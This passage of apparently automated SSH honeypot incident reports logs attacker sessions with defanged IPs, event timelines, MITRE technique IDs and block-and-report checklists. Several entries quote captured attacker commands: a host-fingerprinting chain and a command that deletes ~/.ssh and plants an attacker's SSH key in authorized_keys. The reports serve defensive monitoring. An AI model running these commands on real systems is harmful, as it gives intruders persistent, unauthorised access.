| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:07:32` | `cowrie.session.connect` |
| `2026-08-10 15:07:32` | `cowrie.client.version` |
| `2026-08-10 15:07:32` | `cowrie.client.kex` |
| `2026-08-10 15:07:34` | `cowrie.login.success` |
| `2026-08-10 15:07:35` | `cowrie.session.params` |
| `2026-08-10 15:07:35` | `cowrie.command.input` |
| `2026-08-10 15:07:35` | `cowrie.command.input` |
| `2026-08-10 15:07:35` | `cowrie.command.input` |
| `2026-08-10 15:07:35` | `cowrie.command.input` |
| `2026-08-10 15:07:35` | `cowrie.command.input` |
| `2026-08-10 15:07:35` | `cowrie.command.success` |
| `2026-08-10 15:07:35` | `cowrie.command.input` |
| `2026-08-10 15:07:35` | `cowrie.command.input` |
| `2026-08-10 15:07:35` | `cowrie.command.input` |
| `2026-08-10 15:07:35` | `cowrie.command.input` |
| `2026-08-10 15:07:35` | `cowrie.log.closed` |
| `2026-08-10 15:07:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c67fd2adfdd7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:09 |
| **Last Seen** | 2026-08-10 15:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:09:31` | `cowrie.session.connect` |
| `2026-08-10 15:09:31` | `cowrie.client.version` |
| `2026-08-10 15:09:31` | `cowrie.client.kex` |
| `2026-08-10 15:09:32` | `cowrie.login.success` |
| `2026-08-10 15:09:33` | `cowrie.session.params` |
| `2026-08-10 15:09:33` | `cowrie.command.input` |
| `2026-08-10 15:09:33` | `cowrie.command.input` |
| `2026-08-10 15:09:33` | `cowrie.command.input` |
| `2026-08-10 15:09:33` | `cowrie.command.input` |
| `2026-08-10 15:09:33` | `cowrie.command.input` |
| `2026-08-10 15:09:33` | `cowrie.command.success` |
| `2026-08-10 15:09:33` | `cowrie.command.input` |
| `2026-08-10 15:09:33` | `cowrie.command.input` |
| `2026-08-10 15:09:33` | `cowrie.command.input` |
| `2026-08-10 15:09:33` | `cowrie.command.input` |
| `2026-08-10 15:09:33` | `cowrie.log.closed` |
| `2026-08-10 15:09:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3430bd259804

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:11 |
| **Last Seen** | 2026-08-10 15:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:11:29` | `cowrie.session.connect` |
| `2026-08-10 15:11:29` | `cowrie.client.version` |
| `2026-08-10 15:11:29` | `cowrie.client.kex` |
| `2026-08-10 15:11:30` | `cowrie.login.success` |
| `2026-08-10 15:11:32` | `cowrie.session.params` |
| `2026-08-10 15:11:32` | `cowrie.command.input` |
| `2026-08-10 15:11:32` | `cowrie.command.input` |
| `2026-08-10 15:11:32` | `cowrie.command.input` |
| `2026-08-10 15:11:32` | `cowrie.command.input` |
| `2026-08-10 15:11:32` | `cowrie.command.input` |
| `2026-08-10 15:11:32` | `cowrie.command.success` |
| `2026-08-10 15:11:32` | `cowrie.command.input` |
| `2026-08-10 15:11:32` | `cowrie.command.input` |
| `2026-08-10 15:11:32` | `cowrie.command.input` |
| `2026-08-10 15:11:32` | `cowrie.command.input` |
| `2026-08-10 15:11:32` | `cowrie.log.closed` |
| `2026-08-10 15:11:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4c2f9de3dbf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:13 |
| **Last Seen** | 2026-08-10 15:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:13:27` | `cowrie.session.connect` |
| `2026-08-10 15:13:27` | `cowrie.client.version` |
| `2026-08-10 15:13:27` | `cowrie.client.kex` |
| `2026-08-10 15:13:29` | `cowrie.login.success` |
| `2026-08-10 15:13:30` | `cowrie.session.params` |
| `2026-08-10 15:13:30` | `cowrie.command.input` |
| `2026-08-10 15:13:30` | `cowrie.command.input` |
| `2026-08-10 15:13:30` | `cowrie.command.input` |
| `2026-08-10 15:13:30` | `cowrie.command.input` |
| `2026-08-10 15:13:30` | `cowrie.command.input` |
| `2026-08-10 15:13:30` | `cowrie.command.success` |
| `2026-08-10 15:13:30` | `cowrie.command.input` |
| `2026-08-10 15:13:30` | `cowrie.command.input` |
| `2026-08-10 15:13:30` | `cowrie.command.input` |
| `2026-08-10 15:13:30` | `cowrie.command.input` |
| `2026-08-10 15:13:30` | `cowrie.log.closed` |
| `2026-08-10 15:13:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68404b78764c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:15 |
| **Last Seen** | 2026-08-10 15:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:15:30` | `cowrie.session.connect` |
| `2026-08-10 15:15:30` | `cowrie.client.version` |
| `2026-08-10 15:15:30` | `cowrie.client.kex` |
| `2026-08-10 15:15:31` | `cowrie.login.success` |
| `2026-08-10 15:15:33` | `cowrie.session.params` |
| `2026-08-10 15:15:33` | `cowrie.command.input` |
| `2026-08-10 15:15:33` | `cowrie.command.input` |
| `2026-08-10 15:15:33` | `cowrie.command.input` |
| `2026-08-10 15:15:33` | `cowrie.command.input` |
| `2026-08-10 15:15:33` | `cowrie.command.input` |
| `2026-08-10 15:15:33` | `cowrie.command.success` |
| `2026-08-10 15:15:33` | `cowrie.command.input` |
| `2026-08-10 15:15:33` | `cowrie.command.input` |
| `2026-08-10 15:15:33` | `cowrie.command.input` |
| `2026-08-10 15:15:33` | `cowrie.command.input` |
| `2026-08-10 15:15:33` | `cowrie.log.closed` |
| `2026-08-10 15:15:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c848b23d23d3

| Field | Detail |
|---|---|
| **Source IP** | `65.20.251[.]170` |
| **First Seen** | 2026-08-10 15:17 |
| **Last Seen** | 2026-08-10 15:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:17:28` | `cowrie.session.connect` |
| `2026-08-10 15:17:28` | `cowrie.client.version` |
| `2026-08-10 15:17:28` | `cowrie.client.kex` |
| `2026-08-10 15:17:30` | `cowrie.login.success` |
| `2026-08-10 15:17:30` | `cowrie.direct-tcpip.request` |
| `2026-08-10 15:17:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.251[.]170` to AbuseIPDB if not already reported
- [ ] Block `65.20.251[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3edfcd680d9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:17 |
| **Last Seen** | 2026-08-10 15:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:17:41` | `cowrie.session.connect` |
| `2026-08-10 15:17:41` | `cowrie.client.version` |
| `2026-08-10 15:17:41` | `cowrie.client.kex` |
| `2026-08-10 15:17:42` | `cowrie.login.success` |
| `2026-08-10 15:17:43` | `cowrie.session.params` |
| `2026-08-10 15:17:43` | `cowrie.command.input` |
| `2026-08-10 15:17:43` | `cowrie.command.input` |
| `2026-08-10 15:17:43` | `cowrie.command.input` |
| `2026-08-10 15:17:43` | `cowrie.command.input` |
| `2026-08-10 15:17:43` | `cowrie.command.input` |
| `2026-08-10 15:17:43` | `cowrie.command.success` |
| `2026-08-10 15:17:43` | `cowrie.command.input` |
| `2026-08-10 15:17:43` | `cowrie.command.input` |
| `2026-08-10 15:17:43` | `cowrie.command.input` |
| `2026-08-10 15:17:43` | `cowrie.command.input` |
| `2026-08-10 15:17:43` | `cowrie.log.closed` |
| `2026-08-10 15:17:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2a0a09519de

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-10 15:20 |
| **Last Seen** | 2026-08-10 15:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:20:00` | `cowrie.session.connect` |
| `2026-08-10 15:20:00` | `cowrie.client.version` |
| `2026-08-10 15:20:00` | `cowrie.client.kex` |
| `2026-08-10 15:20:01` | `cowrie.login.success` |
| `2026-08-10 15:20:02` | `cowrie.session.params` |
| `2026-08-10 15:20:02` | `cowrie.command.input` |
| `2026-08-10 15:20:02` | `cowrie.command.input` |
| `2026-08-10 15:20:02` | `cowrie.command.input` |
| `2026-08-10 15:20:02` | `cowrie.command.input` |
| `2026-08-10 15:20:02` | `cowrie.command.input` |
| `2026-08-10 15:20:02` | `cowrie.command.success` |
| `2026-08-10 15:20:02` | `cowrie.command.input` |
| `2026-08-10 15:20:02` | `cowrie.command.input` |
| `2026-08-10 15:20:02` | `cowrie.command.input` |
| `2026-08-10 15:20:02` | `cowrie.command.input` |
| `2026-08-10 15:20:02` | `cowrie.log.closed` |
| `2026-08-10 15:20:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9db76acec3a0

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-10 15:20 |
| **Last Seen** | 2026-08-10 15:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:20:28` | `cowrie.session.connect` |
| `2026-08-10 15:20:28` | `cowrie.client.version` |
| `2026-08-10 15:20:28` | `cowrie.client.kex` |
| `2026-08-10 15:20:29` | `cowrie.login.success` |
| `2026-08-10 15:20:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7683e756348

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-10 15:20 |
| **Last Seen** | 2026-08-10 15:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:20:29` | `cowrie.session.connect` |
| `2026-08-10 15:20:29` | `cowrie.client.version` |
| `2026-08-10 15:20:29` | `cowrie.client.kex` |
| `2026-08-10 15:20:30` | `cowrie.login.success` |
| `2026-08-10 15:20:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-557ffcf9b682

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-10 15:20 |
| **Last Seen** | 2026-08-10 15:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:20:35` | `cowrie.session.connect` |
| `2026-08-10 15:20:35` | `cowrie.client.version` |
| `2026-08-10 15:20:36` | `cowrie.client.kex` |
| `2026-08-10 15:20:37` | `cowrie.login.success` |
| `2026-08-10 15:20:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10dc1c032733

| Field | Detail |
|---|---|
| **Source IP** | `140.245.50[.]204` |
| **First Seen** | 2026-08-10 15:20 |
| **Last Seen** | 2026-08-10 15:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:20:37` | `cowrie.session.connect` |
| `2026-08-10 15:20:37` | `cowrie.client.version` |
| `2026-08-10 15:20:37` | `cowrie.client.kex` |
| `2026-08-10 15:20:38` | `cowrie.login.success` |
| `2026-08-10 15:20:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.245.50[.]204` to AbuseIPDB if not already reported
- [ ] Block `140.245.50[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-835c8119068d

| Field | Detail |
|---|---|
| **Source IP** | `61.76.136[.]25` |
| **First Seen** | 2026-08-10 15:21 |
| **Last Seen** | 2026-08-10 15:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:21:08` | `cowrie.session.connect` |
| `2026-08-10 15:21:08` | `cowrie.client.version` |
| `2026-08-10 15:21:08` | `cowrie.client.kex` |
| `2026-08-10 15:21:09` | `cowrie.login.success` |
| `2026-08-10 15:21:10` | `cowrie.session.params` |
| `2026-08-10 15:21:10` | `cowrie.command.input` |
| `2026-08-10 15:21:10` | `cowrie.command.failed` |
| `2026-08-10 15:21:10` | `cowrie.log.closed` |
| `2026-08-10 15:21:11` | `cowrie.session.params` |
| `2026-08-10 15:21:11` | `cowrie.command.input` |
| `2026-08-10 15:21:11` | `cowrie.session.file_download` |
| `2026-08-10 15:21:11` | `cowrie.log.closed` |
| `2026-08-10 15:21:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.136[.]25` to AbuseIPDB if not already reported
- [ ] Block `61.76.136[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cec18ed4031

| Field | Detail |
|---|---|
| **Source IP** | `61.76.136[.]25` |
| **First Seen** | 2026-08-10 15:21 |
| **Last Seen** | 2026-08-10 15:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:21:11` | `cowrie.session.connect` |
| `2026-08-10 15:21:13` | `cowrie.client.version` |
| `2026-08-10 15:21:13` | `cowrie.client.kex` |
| `2026-08-10 15:21:14` | `cowrie.login.success` |
| `2026-08-10 15:21:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.136[.]25` to AbuseIPDB if not already reported
- [ ] Block `61.76.136[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb0de9632152

| Field | Detail |
|---|---|
| **Source IP** | `61.76.136[.]25` |
| **First Seen** | 2026-08-10 15:21 |
| **Last Seen** | 2026-08-10 15:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:21:15` | `cowrie.session.connect` |
| `2026-08-10 15:21:15` | `cowrie.client.version` |
| `2026-08-10 15:21:15` | `cowrie.client.kex` |
| `2026-08-10 15:21:16` | `cowrie.login.success` |
| `2026-08-10 15:21:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.136[.]25` to AbuseIPDB if not already reported
- [ ] Block `61.76.136[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3140842d986

| Field | Detail |
|---|---|
| **Source IP** | `45.144.233[.]139` |
| **First Seen** | 2026-08-10 15:22 |
| **Last Seen** | 2026-08-10 15:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:22:06` | `cowrie.session.connect` |
| `2026-08-10 15:22:06` | `cowrie.client.version` |
| `2026-08-10 15:22:06` | `cowrie.client.kex` |
| `2026-08-10 15:22:06` | `cowrie.login.success` |
| `2026-08-10 15:22:07` | `cowrie.session.params` |
| `2026-08-10 15:22:07` | `cowrie.command.input` |
| `2026-08-10 15:22:07` | `cowrie.command.failed` |
| `2026-08-10 15:22:07` | `cowrie.log.closed` |
| `2026-08-10 15:22:08` | `cowrie.session.params` |
| `2026-08-10 15:22:08` | `cowrie.command.input` |
| `2026-08-10 15:22:08` | `cowrie.session.file_download` |
| `2026-08-10 15:22:08` | `cowrie.log.closed` |
| `2026-08-10 15:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.144.233[.]139` to AbuseIPDB if not already reported
- [ ] Block `45.144.233[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac0d1dfe9e5f

| Field | Detail |
|---|---|
| **Source IP** | `45.144.233[.]139` |
| **First Seen** | 2026-08-10 15:22 |
| **Last Seen** | 2026-08-10 15:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 15:22:08` | `cowrie.session.connect` |
| `2026-08-10 15:22:08` | `cowrie.client.version` |
| `2026-08-10 15:22:08` | `cowrie.client.kex` |
| `2026-08-10 15:22:08` | `cowrie.login.success` |
| `2026-08-10 15:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.144.233[.]139` to AbuseIPDB if not already reported
- [ ] Block `45.144.233[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c83d3061df0f

| Field | Detail |
|---|---|
| **Source IP** | `45.144.233[.]139` |
| **First Seen** | 2026-08-10 15:22 |
| **Last Seen** | 2026-08-10 15:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
